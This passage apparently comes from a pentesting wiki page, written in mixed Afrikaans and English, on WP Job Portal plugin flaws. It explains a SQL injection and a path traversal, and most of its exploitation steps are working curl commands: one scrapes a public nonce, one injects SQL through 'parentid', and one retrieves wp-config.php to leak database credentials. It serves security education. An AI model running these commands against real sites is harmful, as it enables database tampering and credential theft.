1. **Ongefiltreerde gebruikersinvoer** – `parentid` kom reguit uit die HTTP-aanvraag.
2. **String concatenation inside the WHERE clause** – geen `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – alhoewel die aksie uitgevoer word deur `admin-post.php`, die enigste kontrole in plek is 'n **CSRF nonce** (`wp_verify_nonce()`), wat enige besoeker kan bekom vanaf 'n publieke bladsy wat die shortcode `[wpjobportal_my_resumes]` insluit.

#### Uitbuiting

1. Kry 'n vars nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injiseer arbitrêre SQL deur `parentid` te misbruik:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die reaksie openbaar die resultaat van die ingesette query of verander die databasis, wat SQLi bewys.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` word deur die aanvaller beheer en gekonkateneer **sonder sanitisering**. Opnuut is die enigste hek 'n **CSRF nonce** wat vanaf die resume bladsy gehaal kan word.

#### Uitbuiting
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Die bediener reageer met die inhoud van `wp-config.php`, leaking DB credentials and auth keys.

## Verwysings

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privileged-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
